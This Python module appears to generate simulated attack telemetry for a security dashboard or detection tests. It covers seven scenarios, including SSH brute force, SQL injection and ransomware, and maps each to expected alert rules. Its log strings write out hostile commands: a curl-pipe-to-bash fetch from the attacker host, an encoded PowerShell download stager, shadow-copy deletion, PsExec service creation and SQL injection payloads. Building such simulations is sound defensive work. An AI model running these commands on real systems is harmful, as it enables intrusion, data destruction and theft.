"""Attack scenarios.

Each scenario produces a timeline of ``(offset_seconds, event)`` tuples that resemble the
telemetry a real intrusion would leave behind. The runner anchors the timeline so the
final event lands at "now", which makes the resulting alerts appear live on the dashboard.
"""

from __future__ import annotations

import base64
import random
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Any

from .environment import HOSTS, USERS, Host, host

Timeline = list[tuple[float, dict[str, Any]]]


@dataclass(frozen=True)
class Scenario:
    slug: str
    name: str
    description: str
    tactics: list[str]
    techniques: list[str]
    default_target: str
    build: Callable[[str, Host, random.Random], Timeline] = field(repr=False)
    expected_rules: list[str] = field(default_factory=list)


def _auth(host_: Host, ip: str, user: str, ok: bool, port: int) -> dict[str, Any]:
    verb = "Accepted password" if ok else "Failed password"
    return {
        "source": "sshd",
        "category": "authentication",
        "action": "login_success" if ok else "login_failure",
        "severity": "info" if ok else "low",
        "host": host_.name,
        "username": user,
        "src_ip": ip,
        "dst_ip": host_.ip,
        "dst_port": 22,
        "message": f"{verb} for {user} from {ip} port {port} ssh2",
    }


def _proc(host_: Host, user: str, image: str, cmdline: str, parent: str, **extra) -> dict:
    return {
        "source": "edr",
        "category": "process",
        "action": extra.pop("action", "process_start"),
        "severity": extra.pop("severity", "info"),
        "host": host_.name,
        "username": user,
        "message": f"{image} started by {user}: {cmdline}",
        "extra": {"process": {"image": image, "cmdline": cmdline, "parent": parent}, **extra},
    }


# ------------------------------------------------------------------ builders
def _ssh_brute_force(attacker: str, target: Host, rng: random.Random) -> Timeline:
    t, out = 0.0, []
    for _ in range(16):
        user = rng.choice(["root", "admin", "admin", "root"])
        out.append((t, _auth(target, attacker, user, False, rng.randint(40000, 65000))))
        t += rng.uniform(2, 6)
    out.append((t, _auth(target, attacker, "admin", True, rng.randint(40000, 65000))))
    t += rng.uniform(5, 15)
    out.append((t, {
        "source": "sudo", "category": "privilege", "action": "sudo", "host": target.name,
        "username": "admin", "src_ip": attacker,
        "message": "admin : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c "
                   "'curl -s http://" + attacker + "/x.sh | bash'",
        "extra": {"target_user": "root",
                  "process": {"cmdline": f"curl -s http://{attacker}/x.sh | bash"}},
    }))
    return out


def _password_spray(attacker: str, target: Host, rng: random.Random) -> Timeline:
    victims = rng.sample(USERS + ["ceo", "hr", "it-admin", "finance"], 11)
    out, t = [], 0.0
    for user in victims:
        event = _auth(target, attacker, user, False, rng.randint(40000, 65000))
        event.update(source="vpn", dst_port=443,
                     message=f"VPN authentication failed for {user} from {attacker}")
        out.append((t, event))
        t += rng.uniform(26, 33)  # slow enough to stay under the per-IP brute-force threshold
    return out


def _port_scan(attacker: str, target: Host, rng: random.Random) -> Timeline:
    ports = sorted(rng.sample(range(1, 10000), 45) + [22, 80, 443, 3306, 3389])
    out, t = [], 0.0
    for port in ports:
        open_ = port in (22, 80, 443)
        out.append((t, {
            "source": "firewall", "category": "network",
            "action": "connection_allowed" if open_ else "connection_blocked",
            "severity": "info" if open_ else "low",
            "host": target.name, "src_ip": attacker, "dst_ip": target.ip, "dst_port": port,
            "message": f"{'ALLOW' if open_ else 'BLOCK'} TCP {attacker} -> {target.ip}:{port} [SYN]",
            "extra": {"protocol": "TCP", "tcp_flags": "S"},
        }))
        t += rng.uniform(0.05, 0.6)
    return out


def _web_attack(attacker: str, target: Host, rng: random.Random) -> Timeline:
    words = ["admin", "backup", ".git/config", "wp-login.php", "phpmyadmin", ".env", "old",
             "test", "api/v1", "server-status", "config.bak", "dev", "console", "uploads",
             "cgi-bin", "debug", "login.aspx", "staging", "db.sql", "install.php"]
    agent = "gobuster/3.6"
    out, t = [], 0.0

    def req(uri: str, status: int, ua: str = agent) -> dict:
        return {
            "source": "nginx", "category": "web", "action": "http_request",
            "severity": "low" if status >= 400 else "info",
            "host": target.name, "src_ip": attacker, "dst_ip": target.ip, "dst_port": 443,
            "message": f"GET {uri} -> {status}",
            "extra": {"http": {"method": "GET", "uri": uri, "status": status,
                               "user_agent": ua}},
        }

    for i in range(40):
        out.append((t, req(f"/{rng.choice(words)}{'' if i % 3 else '/'}{i}", 404)))
        t += rng.uniform(0.2, 0.9)
    out.append((t, req("/products.php?id=7", 200)))
    for payload in ["7'", "7' OR '1'='1", "7 UNION SELECT username,password FROM users--",
                    "7 AND SLEEP(5)--"]:
        t += rng.uniform(2, 5)
        out.append((t, req(f"/products.php?id={payload}", 500, "sqlmap/1.8")))
    return out


def _ransomware(attacker: str, target: Host, rng: random.Random) -> Timeline:
    user = "carol" if target.name == "wks-carol" else rng.choice(USERS[:6])
    stager = f"IEX (New-Object Net.WebClient).DownloadString('http://{attacker}/a')"
    encoded = base64.b64encode(stager.encode("utf-16-le")).decode()
    out: Timeline = [
        (0, _proc(target, user, "WINWORD.EXE",
                  r'"WINWORD.EXE" /n "C:\Users\%s\Downloads\Invoice_8841.docm"' % user,
                  "explorer.exe")),
        (4, _proc(target, user, "powershell.exe",
                  f"powershell.exe -NoP -W Hidden -enc {encoded}", "WINWORD.EXE",
                  severity="medium")),
        (6, {"source": "firewall", "category": "network", "action": "connection_allowed",
             "host": target.name, "src_ip": target.ip, "dst_ip": attacker, "dst_port": 443,
             "message": f"ALLOW TCP {target.ip} -> {attacker}:443",
             "extra": {"bytes_out": 4211, "bytes_in": 812_330}}),
        (40, _proc(target, user, "vssadmin.exe", "vssadmin delete shadows /all /quiet",
                   "cmd.exe", severity="high")),
        (42, _proc(target, user, "bcdedit.exe", "bcdedit /set {default} recoveryenabled No",
                   "cmd.exe", severity="medium")),
    ]
    t = 45.0
    folders = ["Documents", "Desktop", "Pictures", r"\\fs-01\finance"]
    files = ["Q3_report.xlsx", "budget.xlsx", "contract.pdf", "photo.jpg", "notes.docx",
             "payroll.csv", "plan.pptx"]
    for i in range(36):
        path = f"C:\\Users\\{user}\\{rng.choice(folders)}\\{i}_{rng.choice(files)}.locked"
        out.append((t, {
            "source": "edr", "category": "file", "action": "file_renamed", "severity": "medium",
            "host": target.name, "username": user,
            "message": f"File renamed to {path}",
            "extra": {"file": {"path": path}, "process": {"image": "svch0st.exe"}},
        }))
        t += rng.uniform(0.3, 1.2)
    return out


def _lateral_movement(attacker: str, target: Host, rng: random.Random) -> Timeline:
    targets = [h for h in HOSTS if h.os == "windows" and h.name != target.name][:4]
    out, t = [], 0.0
    for dest in targets:
        out.append((t, {
            "source": "windows-security", "category": "authentication",
            "action": "login_success", "host": dest.name, "username": "svc_backup",
            "src_ip": target.ip, "dst_ip": dest.ip, "dst_port": 445,
            "message": f"An account was successfully logged on (type 3) from {target.ip}",
            "extra": {"logon_type": 3, "event_id": 4624},
        }))
        t += rng.uniform(1, 3)
        out.append((t, _proc(
            dest, "svc_backup", "services.exe",
            r"sc.exe \\%s create PSEXESVC binPath= C:\Windows\PSEXESVC.exe" % dest.name,
            "psexec.exe", action="service_created", severity="medium",
            service={"name": "PSEXESVC", "remote": True, "origin": target.name},
        )))
        t += rng.uniform(40, 90)
    return out


def _exfiltration(attacker: str, target: Host, rng: random.Random) -> Timeline:
    return [
        (0, _proc(target, "deploy", "mysqldump",
                  "mysqldump --all-databases -u root -p**** > /tmp/.cache/db.sql", "bash")),
        (35, _proc(target, "deploy", "tar", "tar czf /tmp/.cache/x.tgz /tmp/.cache/db.sql",
                   "bash")),
        (50, {"source": "dns", "category": "dns", "action": "dns_query", "host": target.name,
              "src_ip": target.ip, "message": "Query A storage-sync-cdn.example",
              "extra": {"dns": {"query": "storage-sync-cdn.example", "answer": attacker}}}),
        (52, {"source": "firewall", "category": "network", "action": "connection_allowed",
              "host": target.name, "src_ip": target.ip, "dst_ip": attacker, "dst_port": 443,
              "message": f"ALLOW TCP {target.ip} -> {attacker}:443 (session closed)",
              "extra": {"bytes_out": rng.randint(310_000_000, 420_000_000),
                        "bytes_in": rng.randint(20_000, 80_000), "duration_s": 212}}),
    ]


SCENARIOS: dict[str, Scenario] = {
    s.slug: s
    for s in [
        Scenario("ssh-brute-force", "SSH brute force & takeover",
                 "Automated password guessing against SSH that ends in a successful login as "
                 "a privileged user, followed by a malicious download via sudo.",
                 ["Credential Access", "Initial Access", "Execution"],
                 ["T1110.001", "T1078", "T1059.004"], "web-01", _ssh_brute_force,
                 ["ssh-brute-force", "brute-force-success", "privileged-login-external"]),
        Scenario("password-spray", "VPN password spraying",
                 "One common password tried against many accounts, paced slowly to stay "
                 "under per-account lockout thresholds.",
                 ["Credential Access"], ["T1110.003"], "dc-01", _password_spray,
                 ["password-spray"]),
        Scenario("port-scan", "External port scan",
                 "SYN scan of ~50 TCP ports on an internet-facing server.",
                 ["Discovery", "Reconnaissance"], ["T1046"], "web-02", _port_scan,
                 ["port-scan"]),
        Scenario("web-attack", "Web recon & SQL injection",
                 "Directory brute forcing with gobuster followed by sqlmap-style SQL "
                 "injection probes against a product page.",
                 ["Reconnaissance", "Initial Access"], ["T1595.003", "T1190"], "web-01",
                 _web_attack, ["web-404-flood", "web-sqli"]),
        Scenario("ransomware", "Phishing to ransomware",
                 "Macro document spawns encoded PowerShell, beacons to C2, deletes shadow "
                 "copies and encrypts files.",
                 ["Execution", "Command and Control", "Impact"],
                 ["T1566.001", "T1059.001", "T1490", "T1486"], "wks-carol", _ransomware,
                 ["encoded-powershell", "shadow-copy-deletion", "mass-file-encryption"]),
        Scenario("lateral-movement", "PsExec lateral movement",
                 "A compromised service account installs remote services across several "
                 "Windows servers from one workstation.",
                 ["Lateral Movement"], ["T1021.002", "T1569.002"], "wks-bob",
                 _lateral_movement, ["lateral-service-install"]),
        Scenario("data-exfiltration", "Database dump & exfiltration",
                 "Database is dumped, compressed and uploaded to an external host over HTTPS.",
                 ["Collection", "Exfiltration"], ["T1005", "T1560.001", "T1048"], "db-01",
                 _exfiltration, ["large-outbound-transfer"]),
    ]
}


def build_timeline(slug: str, attacker_ip: str, target_name: str | None,
                   rng: random.Random | None = None) -> tuple[Scenario, Host, Timeline]:
    scenario = SCENARIOS[slug]
    target = host(target_name, scenario.default_target)
    return scenario, target, scenario.build(attacker_ip, target, rng or random.Random())
